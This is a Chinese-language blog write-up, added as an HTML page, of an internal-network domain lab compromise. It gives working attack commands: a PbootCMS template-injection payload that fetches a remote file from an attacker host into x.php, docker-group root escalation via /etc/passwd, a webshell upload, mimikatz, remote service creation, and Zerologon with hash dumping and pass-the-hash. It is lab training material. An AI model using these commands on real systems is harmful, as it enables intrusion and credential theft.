@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            高度安全的内网域靶场-FBI |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"The price of doing the same old thing is far higher than the price of change."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">高度安全的内网域靶场-FBI</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2023-09-20 13:50:30</span>
+        <span class="mobile">2023-09-20 13:50</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">完整渗透测试靶场</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PbootCMS%E5%90%8E%E5%8F%B0RCE/">PbootCMS后台RCE</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Docker%E7%BB%84%E6%8F%90%E6%9D%83/">Docker组提权</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/jspXCMS%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/">jspXCMS文件上传目录穿越</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E/">横向移动密码碰撞</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%9F%9F%E6%BC%8F%E6%B4%9ECVE-2020-1472/">域漏洞CVE-2020-1472</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="/2023/09/20/fbi/image-20240116022815013.png" alt="fbi网络拓扑图.drawio"></p>
+<p>PS：该靶场作者：<a class="link" target="_blank" rel="noopener" href="https://www.moonsec.com/">暗月<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="HOSTS设置"><a href="#HOSTS设置" class="headerlink" title="HOSTS设置"></a>HOSTS设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	kali</span><br><span class="line">::1		localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1		ip6-allnodes</span><br><span class="line">ff02::2		ip6-allrouters</span><br><span class="line"><span class="comment"># 5-fbi</span></span><br><span class="line">192.168.0.205 www.cf1.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116022824967.png" alt="image-20240116022824967"></p>
+<h1 id="外网WEB服务器"><a href="#外网WEB服务器" class="headerlink" title="外网WEB服务器"></a>外网WEB服务器</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O 192.168.0.205</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org )</span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.cf1.com (192.168.0.205)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd</span><br><span class="line">888/tcp  open  http    Apache httpd</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    Ajenti http control panel</span><br><span class="line">MAC Address: 00:0C:29:1C:84:0C (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: 0b842aa5.phpmyadmin; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.94 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;www.cf1.com&quot;</span> -e php,htm,js,bak,zip,tar.gz,tgz,txt -r -R 1 -i 200-399</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, htm, js, bak, zip, tar.gz, tgz, txt | HTTP method: GET | Threads: 30 | Wordlist size: 12472</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/.dirsearch/reports/www.cf1.com.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/kali/.dirsearch/logs/errors.log</span><br><span class="line"></span><br><span class="line">Target: http://www.cf1.com/</span><br><span class="line"></span><br><span class="line">[03:06:43] Starting: </span><br><span class="line">[03:06:44] 200 -   26B  - /.gitattributes                                </span><br><span class="line">[03:06:44] 200 -  541B  - /.gitignore                                    </span><br><span class="line">[03:06:54] 200 -    4KB - /admin.php                                      </span><br><span class="line">[03:07:02] 200 -   81B  - /api.php                                        </span><br><span class="line">[03:07:02] 301 -  293B  - /apps  -&gt;  http://www.cf1.com/apps/     (Added to queue)</span><br><span class="line">[03:07:05] 200 -    1KB - /cgi-bin/test-cgi                               </span><br><span class="line">[03:07:05] 301 -  295B  - /config  -&gt;  http://www.cf1.com/config/     (Added to queue)</span><br><span class="line">[03:07:06] 200 -    1KB - /config.tar.gz                                  </span><br><span class="line">[03:07:07] 301 -  293B  - /core  -&gt;  http://www.cf1.com/core/     (Added to queue)</span><br><span class="line">[03:07:07] 301 -  293B  - /data  -&gt;  http://www.cf1.com/data/     (Added to queue)</span><br><span class="line">[03:07:08] 301 -  292B  - /doc  -&gt;  http://www.cf1.com/doc/     (Added to queue)</span><br><span class="line">[03:07:10] 200 -    4KB - /favicon.ico                                    </span><br><span class="line">[03:07:13] 200 -   19KB - /index.php                                      </span><br><span class="line">[03:07:26] 200 -   43B  - /robots.txt                                     </span><br><span class="line">[03:07:29] 301 -  295B  - /static  -&gt;  http://www.cf1.com/static/     (Added to queue)</span><br><span class="line">[03:07:30] 301 -  297B  - /template  -&gt;  http://www.cf1.com/template/     (Added to queue)</span><br><span class="line">[03:07:35] Starting: apps/                                                 </span><br><span class="line">[03:07:46] 301 -  299B  - /apps/admin  -&gt;  http://www.cf1.com/apps/admin/   </span><br><span class="line">[03:07:54] 301 -  297B  - /apps/api  -&gt;  http://www.cf1.com/apps/api/     </span><br><span class="line">[03:07:58] 301 -  300B  - /apps/common  -&gt;  http://www.cf1.com/apps/common/ </span><br><span class="line">[03:08:06] 301 -  298B  - /apps/home  -&gt;  http://www.cf1.com/apps/home/   </span><br><span class="line">[03:08:30] Starting: config/                                               </span><br><span class="line">[03:08:53] 200 -    0B  - /config/config.php                              </span><br><span class="line">[03:08:54] 200 -  857B  - /config/database.php~                           </span><br><span class="line">[03:08:55] 200 -    0B  - /config/database.php                            </span><br><span class="line">[03:09:24] Starting: core/                                                 </span><br><span class="line">[03:09:42] 301 -  299B  - /core/basic  -&gt;  http://www.cf1.com/core/basic/   </span><br><span class="line">[03:09:43] 301 -  299B  - /core/cache  -&gt;  http://www.cf1.com/core/cache/   </span><br><span class="line">[03:09:46] 301 -  302B  - /core/database  -&gt;  http://www.cf1.com/core/database/</span><br><span class="line">[03:09:54] 301 -  297B  - /core/log  -&gt;  http://www.cf1.com/core/log/     </span><br><span class="line">[03:10:06] 200 -   48B  - /core/start.php                                 </span><br><span class="line">[03:10:07] 301 -  302B  - /core/template  -&gt;  http://www.cf1.com/core/template/</span><br><span class="line">[03:10:13] Starting: data/                                                 </span><br><span class="line">[03:11:06] Starting: doc/                                                  </span><br><span class="line">[03:11:11] 200 -   23KB - /doc/ChangeLog.txt                              </span><br><span class="line">[03:11:57] Starting: static/                                               </span><br><span class="line">[03:12:15] 301 -  302B  - /static/backup  -&gt;  http://www.cf1.com/static/backup/</span><br><span class="line">[03:12:24] 301 -  302B  - /static/images  -&gt;  http://www.cf1.com/static/images/</span><br><span class="line">[03:12:43] 301 -  302B  - /static/upload  -&gt;  http://www.cf1.com/static/upload/</span><br><span class="line">[03:12:47] Starting: template/                                             </span><br><span class="line">[03:13:10] 301 -  305B  - /template/default  -&gt;  http://www.cf1.com/template/default/</span><br><span class="line">                                                                           </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116022841091.png" alt="image-20240116022841091"></p>
+<p><img src="/2023/09/20/fbi/image-20240116022848955.png" alt="image-20240116022848955"></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>通过目录遍历查看到数据库的配置文件<code>database.php~</code>，配置中存放有数据库文件。</p>
+<p><img src="/2023/09/20/fbi/image-20240116022907358.png" alt="image-20240116022907358"></p>
+<p><img src="/2023/09/20/fbi/image-20240116022915195.png" alt="image-20240116022915195"></p>
+<p>Navicat打开数据库文件查看密码。</p>
+<p><img src="/2023/09/20/fbi/image-20240116022929951.png" alt="image-20240116022929951"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8187bef2c0b83e6b0b747d92b0a65eb1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116022940251.png" alt="image-20240116022940251"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3e6b1812df726be884ddcfc4139128db</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116022949927.png" alt="image-20240116022949927"></p>
+<p>备份文件<code>config.tar.gz</code>中也存在该数据库文件地址。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023013925.png" alt="image-20240116023013925"></p>
+<p>登录后台：</p>
+<p><img src="/2023/09/20/fbi/image-20240116023025039.png" alt="image-20240116023025039"></p>
+<h2 id="后台任意代码执行GetShell"><a href="#后台任意代码执行GetShell" class="headerlink" title="后台任意代码执行GetShell"></a>后台任意代码执行GetShell</h2><p>根据收集到的版本信息，可以搜索到该版本后台存在命令执行漏洞。因为$字符不能使用，所以这里读取远程文件后写入到x.php中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原语句</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;sites.txt&quot;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://192.168.0.12/1.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#exp</span></span><br><span class="line">&#123;pboot:<span class="keyword">if</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;file_pu&#x27;</span>,<span class="string">&#x27;t_contents&#x27;</span>])(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>]),<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;file_ge&#x27;</span>,<span class="string">&#x27;t_contents&#x27;</span>])(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;http://192.168.0.12/&#x27;</span>,<span class="string">&#x27;1.txt&#x27;</span>]))))&#125;!!!&#123;/pboot:<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023036613.png" alt="image-20240116023036613"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023050590.png" alt="image-20240116023050590"></p>
+<p>通过前期的端口扫描可以发现网站是bt搭建的，这里需要绕过disable_funcions。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023100670.png" alt="image-20240116023100670"></p>
+<h3 id="disable-funcions绕过"><a href="#disable-funcions绕过" class="headerlink" title="disable_funcions绕过"></a>disable_funcions绕过</h3><p>使用蚁剑插件，选择PHP7_GC_UAF，运行后弹出命令终端。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023119304.png" alt="image-20240116023119304"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023127745.png" alt="image-20240116023127745"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>上线msf，上传linpeas执行查看可能利用的信息。</p>
+<h3 id="私钥登录docker提权"><a href="#私钥登录docker提权" class="headerlink" title="私钥登录docker提权"></a>私钥登录docker提权</h3><p><img src="/2023/09/20/fbi/image-20240116023136254.png" alt="image-20240116023136254"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 ./cf1_rsa</span><br><span class="line">ssh cf1@192.168.0.205 -i ./cf1_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023155199.png" alt="image-20240116023155199"></p>
+<p>该用户组中包含docker，使用docker用户组提权。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023149164.png" alt="image-20240116023149164"></p>
+<p>生成Hash备用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt root123 </span><br><span class="line">Password: root123</span><br><span class="line">$1$root123<span class="variable">$ZiuAO2uMtNBgXNF6wxsGX1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023210234.png" alt="image-20240116023210234"></p>
+<p>修改passwd文件，添加特权账号root123。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /etc/:/mnt -it alpine</span><br><span class="line"><span class="built_in">cd</span> /mnt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;root123:$1$root123$ZiuAO2uMtNBgXNF6wxsGX1:0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023222904.png" alt="image-20240116023222904"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023231319.png" alt="image-20240116023231319"></p>
+<p>成功拿到root权限。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023239151.png" alt="image-20240116023239151"></p>
+<h1 id="内网WEB服务器"><a href="#内网WEB服务器" class="headerlink" title="内网WEB服务器"></a>内网WEB服务器</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>msf获取路由拿到<code>192.168.188.0/24</code>网段。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023255873.png" alt="image-20240116023255873"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023301497.png" alt="image-20240116023301497"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023308385.png" alt="image-20240116023308385"></p>
+<h2 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>后台通过弱口令<code>admin/123456</code>进入。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023354674.png" alt="image-20240116023354674"></p>
+<h2 id="文件上传GetShell"><a href="#文件上传GetShell" class="headerlink" title="文件上传GetShell"></a>文件上传GetShell</h2><p>这个漏洞在文件管理的压缩包上传功能，上传的压缩包会被自动解压，在压缩包中放入 war 包并配合解压后目录穿越 war 包就会被移动到 tomcat 的 webapps 目录，而 tomcat 会自动解压 war 包。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cf shell.war ./shell.jsp </span><br></pre></td></tr></table></figure>
+
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/forg1222/Script/blob/main/PyScript/directoryTraversalZip/main.py">python脚本地址<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="/2023/09/20/fbi/image-20240116023427918.png" alt="image-20240116023427918"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023434127.png" alt="image-20240116023434127"></p>
+<p>上传后连接：</p>
+<p><img src="/2023/09/20/fbi/image-20240116023440715.png" alt="image-20240116023440715"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023449269.png" alt="image-20240116023449269"></p>
+<p>能连外网，则反向上线CS。冰蝎命令执行木马上线失败，命令执行会被拦截。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023456875.png" alt="image-20240116023456875"></p>
+<p>通过冰蝎反弹shell上线成功。</p>
+<p><img src="/2023/09/20/fbi/image-20240116023503474.png" alt="image-20240116023503474"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023508611.png" alt="image-20240116023508611"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023515910.png" alt="image-20240116023515910"></p>
+<h1 id="文件服务器"><a href="#文件服务器" class="headerlink" title="文件服务器"></a>文件服务器</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>mimikatz抓取明文密码：</p>
+<p><img src="/2023/09/20/fbi/image-20240116023524149.png" alt="image-20240116023524149"></p>
+<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><img src="/2023/09/20/fbi/image-20240116023534376.png" alt="image-20240116023534376"></p>
+<h2 id="密码碰撞"><a href="#密码碰撞" class="headerlink" title="密码碰撞"></a>密码碰撞</h2><p>当前会话密码碰撞成功，但是CS的插件上线都不成功，手动执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\10.10.11.128\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023545797.png" alt="image-20240116023545797"></p>
+<p>正向上线不行，在<code>10.10.11.129</code>机器上创建监听器，生成反向木马上线。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy second.exe \\10.10.11.128\c$</span><br><span class="line">shell sc \\10.10.11.128 create shellc binpath= <span class="string">&quot;cmd.exe /c start c:\second.exe&quot;</span></span><br><span class="line">shell sc \\10.10.11.128 start shellc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023603296.png" alt="image-20240116023603296"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023608795.png" alt="image-20240116023608795"></p>
+<p>反向没反应，开启10.10.11.129入站的端口3344，成功上线。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall firewall add rule name=open3344 protocol=TCP localport=3344 <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023619896.png" alt="image-20240116023619896"></p>
+<h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>收集域内信息，定位域控IP。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br><span class="line">shell net time /domain</span><br><span class="line">shell ping dc.fbi.gov</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023629271.png" alt="image-20240116023629271"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023634917.png" alt="image-20240116023634917"></p>
+<p><img src="/2023/09/20/fbi/image-20240116023641155.png" alt="image-20240116023641155"></p>
+<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><h3 id="获取DC主机名"><a href="#获取DC主机名" class="headerlink" title="获取DC主机名"></a>获取DC主机名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net time /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023706862.png" alt="image-20240116023706862"></p>
+<h3 id="连接DC清空凭据"><a href="#连接DC清空凭据" class="headerlink" title="连接DC清空凭据"></a>连接DC清空凭据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python cve-2020-1472-exploit.py dc 10.10.12.139</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023713621.png" alt="image-20240116023713621"></p>
+<h3 id="获取域内Hash"><a href="#获取域内Hash" class="headerlink" title="获取域内Hash"></a>获取域内Hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 impacket-0.10.0/examples/secretsdump.py dc\<span class="variable">$@10</span>.10.12.139 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023719814.png" alt="image-20240116023719814"></p>
+<h3 id="通过Hash链接域控"><a href="#通过Hash链接域控" class="headerlink" title="通过Hash链接域控"></a>通过Hash链接域控</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 impacket-0.10.0/examples/wmiexec.py -hashes :669a3273144a82b942377c1001ed03a3 fbi.gov/administrator@10.10.12.139</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023726406.png" alt="image-20240116023726406"></p>
